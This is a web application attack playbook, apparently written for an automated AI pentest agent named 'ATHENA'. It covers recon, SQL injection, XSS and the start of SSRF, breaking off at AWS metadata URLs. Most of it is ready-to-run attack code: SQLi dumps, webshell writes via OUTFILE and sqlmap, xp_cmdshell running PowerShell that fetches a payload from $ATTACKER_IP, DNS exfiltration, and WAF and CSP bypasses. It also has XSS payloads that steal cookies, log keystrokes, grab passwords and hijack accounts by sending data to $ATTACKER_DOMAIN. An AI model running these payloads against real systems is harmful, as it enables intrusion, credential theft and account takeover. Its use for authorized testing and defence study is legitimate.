# ATHENA Web Application Attack Playbook
**Version:** 1.0
**Date:** 2026-02-26
**Classification:** RESTRICTED - Authorized Pentest Use Only
**Sources:** PayloadsAllTheThings (MIT License), HackTricks Methodology, PortSwigger Web Security Academy, OWASP
**Maintained by:** ATHENA Agent Knowledge System

---

## Overview

This playbook covers the full web application attack lifecycle from initial reconnaissance through exploitation and evidence collection. Each technique includes ATHENA-ready command templates with placeholder variables that agents substitute at runtime. All attack chains are structured as decision trees to guide automated and semi-automated testing.

### Variable Convention

| Variable | Meaning |
|---|---|
| `$TARGET_URL` | Full target URL (e.g., `https://app.target.com`) |
| `$TARGET_DOMAIN` | Base domain (e.g., `target.com`) |
| `$TARGET_IP` | Target IP address |
| `$INJECTION_POINT` | Vulnerable parameter or field |
| `$ATTACKER_IP` | ATHENA agent machine IP |
| `$ATTACKER_DOMAIN` | Attacker-controlled domain for OOB callbacks |
| `$COLLAB_URL` | Burp Collaborator or interactsh URL |
| `$OUTPUT_DIR` | Directory for output files |
| `$WORDLIST` | Path to wordlist |
| `$SESSION_COOKIE` | Authenticated session cookie value |
| `$JWT_TOKEN` | JWT token for testing |
| `$API_KEY` | API key in use |
| `$DBNAME` | Target database name |
| `$TABLENAME` | Target table name |

---

## Pre-Engagement Checklist

Before running any attack chain, confirm:

- [ ] Scope confirmed in writing — verify `$TARGET_URL` and `$TARGET_DOMAIN` are in scope
- [ ] Burp Suite proxy running (`127.0.0.1:8080`)
- [ ] Burp Collaborator or interactsh active for OOB detection
- [ ] `$OUTPUT_DIR` created: `mkdir -p $OUTPUT_DIR`
- [ ] VPN/tunnel to target environment active if required
- [ ] Screenshot tool ready for evidence collection

---

## Section 1: Reconnaissance and Attack Surface Mapping

**Objective:** Map the full web application surface before targeted attacks.

### 1.1 Passive Reconnaissance

**Tools:** amass, subfinder, assetfinder, crt.sh

```bash
# Subdomain enumeration — passive
amass enum -passive -d $TARGET_DOMAIN -o $OUTPUT_DIR/amass-passive.txt
subfinder -d $TARGET_DOMAIN -o $OUTPUT_DIR/subfinder.txt -all
assetfinder --subs-only $TARGET_DOMAIN | tee $OUTPUT_DIR/assetfinder.txt

# Certificate transparency search
curl -s "https://crt.sh/?q=%25.$TARGET_DOMAIN&output=json" \
  | jq -r '.[].name_value' | sort -u > $OUTPUT_DIR/crt-subdomains.txt

# Combine and resolve live hosts
cat $OUTPUT_DIR/amass-passive.txt $OUTPUT_DIR/subfinder.txt $OUTPUT_DIR/assetfinder.txt \
  | sort -u | dnsx -a -resp -o $OUTPUT_DIR/live-subdomains.txt
```

### 1.2 Active Reconnaissance

**Tools:** gobuster, feroxbuster, ffuf, nuclei, katana

```bash
# Directory and file enumeration
feroxbuster -u $TARGET_URL \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,html,js,txt,bak,old,zip,json,xml,config,env \
  -t 50 --no-recursion \
  -o $OUTPUT_DIR/feroxbuster.txt

# Virtual host discovery
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u $TARGET_URL/ \
  -H "Host: FUZZ.$TARGET_DOMAIN" \
  -fw 100 -fc 301,302,400 \
  -o $OUTPUT_DIR/vhosts.json

# Technology fingerprinting
whatweb -v $TARGET_URL | tee $OUTPUT_DIR/whatweb.txt
nikto -h $TARGET_URL -o $OUTPUT_DIR/nikto.txt -Format txt

# Web crawl — builds endpoint list for attack surface
katana -u $TARGET_URL -d 5 -kf all -o $OUTPUT_DIR/katana-crawl.txt

# Automated CVE and misconfiguration scan
nuclei -u $TARGET_URL \
  -t cves/ -t exposures/ -t misconfigurations/ -t technologies/ \
  -severity critical,high,medium \
  -o $OUTPUT_DIR/nuclei-findings.txt

# Sensitive file check
for f in robots.txt sitemap.xml .git/HEAD .env .env.backup web.config phpinfo.php; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/$f")
  echo "$status $TARGET_URL/$f" >> $OUTPUT_DIR/sensitive-files.txt
done
```

### 1.3 JavaScript and API Endpoint Discovery

```bash
# Extract all URLs from Wayback Machine and crawlers
gau $TARGET_DOMAIN | tee $OUTPUT_DIR/gau-urls.txt
waybackurls $TARGET_DOMAIN | tee $OUTPUT_DIR/wayback-urls.txt

# Extract JS files
cat $OUTPUT_DIR/gau-urls.txt | grep -E '\.js$' | sort -u > $OUTPUT_DIR/js-files.txt

# Find API keys and secrets in JS
python3 SecretFinder.py -i $TARGET_URL -d -o $OUTPUT_DIR/secrets-from-js.html

# API endpoint discovery
kiterunner scan $TARGET_URL/api/ \
  -w /path/to/routes-large.kite \
  -x 20 --fail-status-codes 400,401,404 \
  -o $OUTPUT_DIR/kiterunner.txt

# Check for OpenAPI/Swagger documentation
for path in /api/swagger.json /swagger.json /openapi.json /api-docs /docs /redoc; do
  curl -s "$TARGET_URL$path" | python3 -m json.tool 2>/dev/null \
    && echo "[FOUND] $TARGET_URL$path" >> $OUTPUT_DIR/api-docs.txt
done
```

### 1.4 Evidence Collection — Reconnaissance

```bash
# Screenshot all discovered hosts
gowitness file -f $OUTPUT_DIR/live-subdomains.txt -P $OUTPUT_DIR/screenshots/

# Save full HTTP response headers
curl -D $OUTPUT_DIR/response-headers.txt -s -o /dev/null $TARGET_URL

# Capture application fingerprint
curl -s -I $TARGET_URL > $OUTPUT_DIR/fingerprint.txt
```

---

## Section 2: SQL Injection (SQLi)

**OWASP:** A03:2021 Injection | **CWE:** CWE-89 | **Severity:** Critical

### 2.1 Attack Chain Overview

```
DETECT injection point
  → Confirm injection type (error-based, boolean, time, UNION)
    → Identify DBMS
      → Enumerate databases → tables → columns
        → Dump target data
          → Attempt OS shell or file read/write (if high priv)
```

### 2.2 Prerequisites and Tools

- sqlmap (automated)
- Burp Suite (manual testing + request capture)
- curl or browser with proxy

### 2.3 Manual Detection

**Step 1 — Inject single quote, observe behavior:**

```bash
# URL parameter
curl -s "$TARGET_URL/page?id=1'"
curl -s "$TARGET_URL/page?id=1\""
curl -s "$TARGET_URL/page?id=1\`"
curl -s "$TARGET_URL/page?id=1--"
curl -s "$TARGET_URL/page?id=1;--"

# POST body
curl -s -X POST "$TARGET_URL/login" \
  -d "username=admin'&password=test"
```

**Indicators of injection:**
- SQL error messages (MySQL, MSSQL, PostgreSQL, Oracle, SQLite errors)
- Behavioral difference: page content changes, extra rows, missing rows
- No change → try boolean-based

**Step 2 — Boolean-based confirmation:**

```sql
-- True condition (same response as baseline)
?id=1 AND 1=1--

-- False condition (different response)
?id=1 AND 1=2--

-- If responses differ → boolean-based SQLi confirmed
```

**Step 3 — Time-based confirmation (when no visible difference):**

```sql
-- MySQL
?id=1 AND SLEEP(5)--

-- MSSQL
?id=1; IF(1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### 2.4 UNION-Based Data Extraction (MySQL)

**Decision:** Use when application reflects query results in the response body.

**Step 1 — Find column count:**

```sql
-- Method 1: ORDER BY (increment until error)
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
?id=1 ORDER BY 3--   -- Error at N means N-1 columns

-- Method 2: UNION NULL padding
?id=1 UNION SELECT NULL--
?id=1 UNION SELECT NULL,NULL--
?id=1 UNION SELECT NULL,NULL,NULL--
```

**Step 2 — Find printable column (substitute NULL with 'a'):**

```sql
?id=1 UNION SELECT 'a',NULL,NULL--
?id=1 UNION SELECT NULL,'a',NULL--
?id=1 UNION SELECT NULL,NULL,'a'--
```

**Step 3 — Extract database information:**

```sql
-- MySQL
?id=0 UNION SELECT NULL,NULL,version()--
?id=0 UNION SELECT NULL,NULL,database()--
?id=0 UNION SELECT NULL,NULL,user()--

-- Enumerate databases
?id=0 UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata--

-- Enumerate tables
?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--

-- Enumerate columns
?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='$TABLENAME'--

-- Dump credentials
?id=0 UNION SELECT 1,username,password FROM $TABLENAME--
```

### 2.5 Error-Based Extraction

```sql
-- MySQL — EXTRACTVALUE
?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--

-- MySQL — UPDATEXML
?id=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
?id=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--

-- MySQL — GROUP BY floor
?id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MSSQL — CONVERT
?id=1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL — CAST
?id=1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
```

### 2.6 Blind Boolean-Based Extraction

```sql
-- Determine database name length
?id=1 AND LENGTH(database())=5--
?id=1 AND LENGTH(database())>4--

-- Extract database name character by character
?id=1 AND SUBSTRING(database(),1,1)='a'--
?id=1 AND ASCII(SUBSTRING(database(),1,1))=97--

-- Binary search optimization (faster)
?id=1 AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 65 AND 90--

-- Extract admin password hash
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50--
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=109--
```

### 2.7 Time-Based Blind Extraction

```sql
-- MySQL
?id=1 AND IF(LENGTH(database())=5,SLEEP(5),0)--
?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(5),0)--
?id=1 AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1,SLEEP(5),0)--

-- MSSQL
?id=1; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5'--
?id=1; IF (ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1)))=97 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
?id=1; SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

### 2.8 DBMS-Specific Payloads

#### MySQL

```sql
-- Version and info
SELECT version(); SELECT @@version; SELECT @@datadir;

-- File read (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE(0x2f6574632f706173737764);  -- hex

-- File write (webshell — requires FILE priv and writable path)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT 0x3c3f706870 INTO DUMPFILE '/var/www/html/shell.php';

-- RCE via xp_cmdshell is MySQL-specific only for MSSQL — use OUTFILE for MySQL
```

#### MSSQL

```sql
-- Enable and use xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- Execute OS command
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$ATTACKER_IP/payload.ps1'')"')--

-- DNS out-of-band exfiltration
'; EXEC master..xp_dirtree '\\$ATTACKER_DOMAIN\share'--
'; DECLARE @q NVARCHAR(1024); SET @q='\\'+@@version+'.'+@$ATTACKER_DOMAIN+'\a'; EXEC xp_dirtree @q--

-- Stacked queries (extract data)
'; DROP TABLE IF EXISTS tmp_exfil; CREATE TABLE tmp_exfil(data NVARCHAR(4000)); INSERT INTO tmp_exfil EXEC xp_cmdshell('id'); SELECT * FROM tmp_exfil--
```

#### PostgreSQL

```sql
-- Time-based
'; SELECT pg_sleep(5)--
' AND 1=1 AND (SELECT pg_sleep(5)) IS NOT NULL--

-- Error-based
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--

-- RCE via COPY (PostgreSQL superuser)
'; COPY (SELECT '') TO PROGRAM 'nslookup $ATTACKER_DOMAIN'--
'; CREATE TABLE tmp(output text); COPY tmp FROM PROGRAM 'id'; SELECT * FROM tmp--

-- Large object file read
'; SELECT lo_import('/etc/passwd')--
'; SELECT cast(lo_get(lo_import('/etc/passwd')) as text)--
```

#### Oracle

```sql
-- Error-based
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

-- Time-based
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- DNS OOB
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.$ATTACKER_DOMAIN')--

-- Dump data
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,table_name,NULL FROM all_tables--
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='$TABLENAME'--
```

#### SQLite

```sql
-- Version
' UNION SELECT 1,sqlite_version()--

-- Enumerate tables
' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table'--

-- Enumerate columns
' UNION SELECT 1,sql FROM sqlite_master WHERE type='table' AND tbl_name='users'--

-- Dump data
' UNION SELECT 1,group_concat(username||':'||password) FROM users--
```

### 2.9 Second-Order SQLi

**Description:** Input stored safely but later used in an unsafe query.

```
Detection approach:
  1. Register with username: admin'--
  2. Trigger the display/usage of that username (e.g., change password for 'admin'--')
  3. Observe if a different user's password is affected
  4. The stored input gets unsafely interpolated in a later SQL query

Testing workflow:
  - Register/create profiles with SQL metacharacters
  - Trigger actions that use stored values in queries
  - Monitor for behavioral changes in other accounts
```

### 2.10 SQLMap Automation

**Use for:** Automated enumeration after manual confirmation of injection point.

```bash
# Basic URL scan
sqlmap -u "$TARGET_URL/page?id=1" --dbs --batch

# POST request
sqlmap -u "$TARGET_URL/login" --data="username=admin&password=test" -p username --dbs

# From Burp Suite request file (recommended — captures full request)
sqlmap -r $OUTPUT_DIR/request.txt --dbs --batch

# Full aggressive scan
sqlmap -r $OUTPUT_DIR/request.txt \
  --risk=3 --level=5 \
  --dbms=mysql \
  --technique=BEUSTQ \
  --threads=10 \
  --batch \
  --dbs

# Cookie-based injection
sqlmap -u "$TARGET_URL/" --cookie="sessionid=abc123; user_id=1*" --dbs

# HTTP header injection
sqlmap -u "$TARGET_URL/" --header="X-Forwarded-For: 1*" --dbs

# Dump specific table
sqlmap -r $OUTPUT_DIR/request.txt -D $DBNAME -T $TABLENAME --dump

# OS shell attempt (MySQL/MSSQL with high privileges)
sqlmap -r $OUTPUT_DIR/request.txt --os-shell

# File read
sqlmap -r $OUTPUT_DIR/request.txt --file-read="/etc/passwd"

# File write (webshell)
sqlmap -r $OUTPUT_DIR/request.txt \
  --file-write="$OUTPUT_DIR/shell.php" \
  --file-dest="/var/www/html/shell.php"

# Second-order SQLi
sqlmap -u "$TARGET_URL/profile" \
  --second-url="$TARGET_URL/display" \
  --data="name=test"

# Proxy through Burp
sqlmap -r $OUTPUT_DIR/request.txt --proxy="http://127.0.0.1:8080" --dbs
```

**WAF Bypass with SQLMap Tamper Scripts:**

```bash
# Space bypass
sqlmap -r $OUTPUT_DIR/request.txt --tamper=space2comment --dbs

# Full WAF evasion stack
sqlmap -r $OUTPUT_DIR/request.txt \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent \
  --dbs

# ModSecurity bypass
sqlmap -r $OUTPUT_DIR/request.txt \
  --tamper=modsecurityversioned,modsecurityzeroversioned \
  --dbs

# Tamper reference
# space2comment    → spaces become /**/
# between          → > becomes BETWEEN x AND y
# randomcase       → randomizes keyword case
# charencode       → URL-encodes chars
# chardoubleencode → double URL-encode
# equaltolike      → = becomes LIKE
# space2dash       → spaces become --\n
# greatest         → > becomes GREATEST()
# space2plus       → spaces become +
```

### 2.11 WAF Bypass — Manual SQLi

```sql
-- Space alternatives
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users    -- Tab
SELECT%0Ausername%0AFROM%0Ausers    -- Newline

-- Case variation
SeLeCt UsErNaMe FrOm UsErS

-- Comment injection
SEL/**/ECT username FROM users
/*!SELECT*/ username FROM users

-- URL encoding
%27 OR %271%27=%271   -- single quote
%2553 = double-encoded %

-- Hex encoding
SELECT 0x61646d696e        -- hex for 'admin'
SELECT CHAR(97,100,109,105,110)  -- CHAR() for 'admin'

-- MySQL conditional comments
1' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL--

-- Scientific notation space bypass
1e0UNION SELECT 1,2,3--

-- Unicode apostrophe
ʼ OR 1=1--  (Unicode U+02BC)
```

### 2.12 DBMS Quick-Reference Cheat Sheet

| Technique | MySQL | MSSQL | PostgreSQL | Oracle |
|-----------|-------|-------|------------|--------|
| Version | `SELECT version()` | `SELECT @@version` | `SELECT version()` | `SELECT banner FROM v$version` |
| Current DB | `SELECT database()` | `SELECT DB_NAME()` | `SELECT current_database()` | `SELECT ora_database_name FROM dual` |
| Current User | `SELECT user()` | `SELECT SYSTEM_USER` | `SELECT current_user` | `SELECT user FROM dual` |
| List Tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| List Columns | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `all_tab_columns` |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |
| String Concat | `CONCAT(a,b)` or `a\|\|b` | `a+b` | `a\|\|b` | `a\|\|b` |
| File Read | `LOAD_FILE('/path')` | `BULK INSERT` | `lo_import()` | `UTL_FILE` |
| File Write | `INTO OUTFILE` | `xp_cmdshell echo` | `COPY TO PROGRAM` | `UTL_FILE.PUT_LINE` |

### 2.13 Evidence Collection — SQLi

```bash
# Save sqlmap output
sqlmap -r $OUTPUT_DIR/request.txt --dbs --batch \
  --output-dir=$OUTPUT_DIR/sqlmap/

# Capture full response with injection
curl -v "$TARGET_URL/page?id=1%27%20AND%20SLEEP(5)--" \
  2>&1 | tee $OUTPUT_DIR/sqli-time-evidence.txt

# Screenshot from Burp — manually save Response tab for report
# Save request/response pair as evidence screenshot
```

**Decision Tree:**

```
SQLi confirmed?
  → Response error visible?  → Use error-based extraction
  → Response content changes? → Use UNION-based if responses are reflective
  → No visible change, just behavioral? → Use boolean-based
  → All fail? → Use time-based (SLEEP/WAITFOR)
  → Time-based confirmed?
    → MSSQL? → Try xp_cmdshell for RCE
    → MySQL? → Try OUTFILE for webshell
    → PostgreSQL? → Try COPY TO PROGRAM for RCE
```

---

## Section 3: Cross-Site Scripting (XSS)

**OWASP:** A03:2021 Injection | **CWE:** CWE-79 | **Severity:** High

### 3.1 Attack Chain Overview

```
IDENTIFY injection points (URL params, forms, headers, cookies)
  → CONFIRM injection type (reflected, stored, DOM)
    → TEST filter bypass if basic payloads blocked
      → ESCALATE to cookie theft / session hijacking
        → ACHIEVE account takeover
```

### 3.2 Prerequisites and Tools

- Burp Suite (intercept + repeater)
- dalfox (automated XSS scanner)
- BeEF (Browser Exploitation Framework, for advanced post-exploitation)
- Collaborator/interactsh (for stored XSS callback confirmation)

### 3.3 Injection Point Identification

**Check all of the following:**

```
URL parameters:    ?name=INJECT&query=INJECT
Form inputs:       text fields, search boxes, comments, usernames
HTTP headers:      User-Agent, Referer, X-Forwarded-For, X-Custom-*
JSON body values:  {"name":"INJECT","email":"INJECT"}
Hidden fields:     <input type="hidden" value="INJECT">
Path parameters:   /profile/INJECT/settings
```

### 3.4 Reflected XSS Detection

**Step 1 — Probe with polyglot (safe, triggers multiple engines):**

```
${{<%[%'"}}%\.
```

**Step 2 — Basic payloads:**

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
'" --><script>alert(1)</script>
```

**Step 3 — Context determination (what surrounds your input in the response):**

| Context | Escape Strategy | Payload |
|---------|----------------|---------|
| HTML body | Tag injection | `<script>alert(1)</script>` |
| HTML attribute (unquoted) | Add space+event | `x onmouseover=alert(1)` |
| HTML attribute (double-quoted) | Break quote | `"><script>alert(1)</script>` |
| HTML attribute (single-quoted) | Break quote | `'><script>alert(1)</script>` |
| JavaScript string (single-quoted) | Break string | `'-alert(1)-'` |
| JavaScript string (double-quoted) | Break string | `"-alert(1)-"` |
| URL context | JS pseudo-protocol | `javascript:alert(1)` |
| CSS context | Style injection | `</style><script>alert(1)</script>` |

### 3.5 Stored XSS Detection

```
1. Inject payloads into all stored data inputs:
   - Profile fields: name, bio, address
   - Comments and reviews
   - File names and metadata
   - Admin notification messages

2. Trigger admin panel view or other users' views

3. Use Burp Collaborator callback to confirm blind stored XSS:
   <script>new Image().src='http://$COLLAB_URL/xss?c='+document.cookie</script>
   <img src="http://$COLLAB_URL/xss-confirm">
```

### 3.6 DOM-Based XSS Detection

```javascript
// Sources (attacker-controlled input reaching a dangerous sink)
document.URL / document.location
document.URLUnencoded
document.referrer
window.name
location.hash
location.search

// Sinks (dangerous functions)
innerHTML / outerHTML
document.write / document.writeln
eval()
setTimeout() / setInterval() with string argument
window.location.href
$.html() [jQuery]
element.src

// Common DOM XSS pattern
// URL: https://target.com/page#<img src=x onerror=alert(1)>
// JS: document.innerHTML = location.hash.substring(1)  ← vulnerable

// Via postMessage sink
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;  // Vulnerable
});
// Exploit:
// <iframe src="https://$TARGET_URL/page"></iframe>
// <script>frames[0].postMessage('<img src=x onerror=alert(1)>', '*')</script>
```

### 3.7 Filter and WAF Bypass Techniques

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<img SRC=x oNeRrOr=alert(1)>

<!-- Event handler alternatives when script tag blocked -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details/open/ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- No parentheses (for alert() filter) -->
<script>alert`1`</script>
<svg/onload=alert`1`>
<script>{onerror=alert}throw 1</script>

<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- Unicode escapes in JavaScript context -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074\u00281\u0029')</script>

<!-- Base64 data URI -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- Null bytes (older parsers) -->
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- String concatenation (bypass keyword filters) -->
<script>eval('ale'+'rt(0)')</script>
<script>window['ale'+'rt'](1)</script>
<script>window['\x61\x6c\x65\x72\x74'](1)</script>

<!-- SVG with CDATA -->
<svg><script>alert&lpar;1&rpar;</script></svg>

<!-- Whitespace manipulation -->
<img  src=x  onerror = alert(1)>
<img%0asrc=x%0aonerror=alert(1)>

<!-- XSS polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 3.8 CSP Bypass Techniques

```bash
# First — check CSP
curl -s -I $TARGET_URL | grep -i content-security-policy
```

```html
<!-- JSONP bypass (when trusted domain has JSONP endpoint) -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>

<!-- CDN with attacker-controlled content (if jsdelivr/unpkg allowed) -->
<script src="https://cdn.jsdelivr.net/gh/$ATTACKER/repo@latest/xss.js"></script>

<!-- Angular CSP bypass (if AngularJS loaded from allowed CDN) -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp><div ng-include="'data:text/html,<script>alert(1)<\/script>'"></div></div>

<!-- base-uri bypass (hijack relative URLs) -->
<base href="https://$ATTACKER_DOMAIN/">

<!-- Nonce bypass (if nonce is reflected and predictable) -->
<script nonce="INTERCEPTED_NONCE">alert(1)</script>

<!-- script-src 'unsafe-eval' present -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- data: URI if allowed in CSP -->
<script src="data:text/javascript,alert(1)"></script>

<!-- Strict-dynamic bypass via trusted script -->
<script nonce=NONCE>document.write('<script src="http://$ATTACKER_IP/xss.js"><\/script>')</script>

<!-- Open redirect in trusted domain → serve malicious JS -->
<script src="https://trusted.com/redirect?to=https://$ATTACKER_DOMAIN/xss.js"></script>
```

### 3.9 Data Exfiltration Payloads (Post-Exploitation)

```javascript
// Cookie theft (requires no HttpOnly)
<script>document.location='https://$ATTACKER_DOMAIN/steal?c='+document.cookie</script>
<script>new Image().src='https://$ATTACKER_DOMAIN/steal?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('https://$ATTACKER_DOMAIN/steal?c='+btoa(document.cookie))</script>

// Keylogger (persistent via stored XSS)
<script>
document.addEventListener('keypress',function(e){
  fetch('https://$ATTACKER_DOMAIN/key?k='+e.key)
})
</script>

// CSRF token theft + account takeover
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET','$TARGET_URL/account/settings',true);
  xhr.onload = function(){
    var token = this.responseText.match(/csrf_token.*?value="([^"]+)"/)[1];
    fetch('$TARGET_URL/account/change_email',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'email=$ATTACKER_DOMAIN@evil.com&csrf_token='+token
    });
  };
  xhr.send();
</script>

// Session hijack — steal API response
<script>
fetch('/api/user/profile').then(r=>r.json()).then(d=>
  fetch('https://$ATTACKER_DOMAIN/steal',{method:'POST',body:JSON.stringify(d)}))
</script>

// Password grabber (for stored XSS in account pages)
<script>
setInterval(function(){
  var pass = document.querySelector('input[type=password]');
  if(pass) fetch('https://$ATTACKER_DOMAIN/?p='+pass.value);
}, 100);
</script>

// Capture form submissions
<script>
document.querySelectorAll('form').forEach(f=>{
  f.addEventListener('submit',function(){
    var data=new FormData(f);
    fetch('https://$ATTACKER_DOMAIN/form?d='+btoa([...data].toString()))
  })
})
</script>

// BeEF hook (full browser exploitation)
<script src="https://$ATTACKER_IP:3000/hook.js"></script>
```

### 3.10 Automated XSS Scanning

```bash
# dalfox — automated XSS scanner
dalfox url "$TARGET_URL/?q=test" \
  --cookie "$SESSION_COOKIE" \
  --output $OUTPUT_DIR/dalfox.txt

# With Burp proxy
dalfox url "$TARGET_URL/?q=test" \
  --proxy http://127.0.0.1:8080

# From URL list
dalfox file $OUTPUT_DIR/gau-urls.txt \
  --cookie "$SESSION_COOKIE" \
  --output $OUTPUT_DIR/dalfox-mass.txt

# nuclei XSS templates
nuclei -u $TARGET_URL \
  -t fuzzing/xss/ \
  -o $OUTPUT_DIR/nuclei-xss.txt
```

### 3.11 Evidence Collection — XSS

```bash
# Screenshot XSS alert firing
# Use Burp Suite Collaborator to capture out-of-band callbacks

# Capture stored XSS callback
# Setup interactsh: interactsh-client -v
# Payload: <script>fetch('http://INTERACTSH_URL/stored-xss?d='+document.cookie)</script>
# Record: timestamp, originating IP, payload location, captured data
```

**Decision Tree:**

```
XSS suspected?
  → Inject <script>alert(1)</script> → Alert fires? → Reflected XSS confirmed
  → No alert? → Try <img src=x onerror=alert(1)>
  → Still blocked? → Analyze HTML context → use context-appropriate bypass
  → Stored XSS? → Use Burp Collaborator callback to confirm blind
  → DOM-based? → Audit JS source for sources/sinks
  → CSP present? → Check for JSONP bypass or misconfigured directive
  → XSS confirmed → escalate to account takeover via cookie theft / CSRF token grab
```

---

## Section 4: Server-Side Request Forgery (SSRF)

**OWASP:** A10:2021 SSRF | **CWE:** CWE-918 | **Severity:** Critical (cloud environments)

### 4.1 Attack Chain Overview

```
IDENTIFY SSRF parameters
  → CONFIRM outbound request reaches attacker (Burp Collaborator)
    → PROBE internal network (localhost, RFC1918)
      → ENUMERATE cloud metadata endpoints
        → STEAL IAM credentials / tokens
          → ESCALATE to RCE (Redis gopher, internal admin panels)
```

### 4.2 Common SSRF Injection Points

```
URL parameters:    ?url=  ?image=  ?src=  ?file=  ?page=  ?link=  ?host=
Webhooks:          callback_url=  notify_url=  redirect=
PDF generators:    URL input to html2pdf / wkhtmltopdf
File imports:      "Import from URL" features
Image processing:  "Upload via URL" features
Preview features:  "Generate link preview"
```

### 4.3 Basic SSRF Confirmation

```bash
# Step 1: Use Burp Collaborator or interactsh for blind SSRF detection
# Your Collaborator URL: $COLLAB_URL

# Inject in suspected parameter:
?url=http://$COLLAB_URL/ssrf-test
?image=http://$COLLAB_URL/ssrf-test
?src=http://$COLLAB_URL/ssrf-test

# Watch Collaborator panel for DNS/HTTP interaction

# Step 2: Test localhost access
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://[::1]/
?url=http://0.0.0.0/
?url=http://0/
```

### 4.4 Cloud Metadata Exploitation

#### AWS IMDSv1 (No header required)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
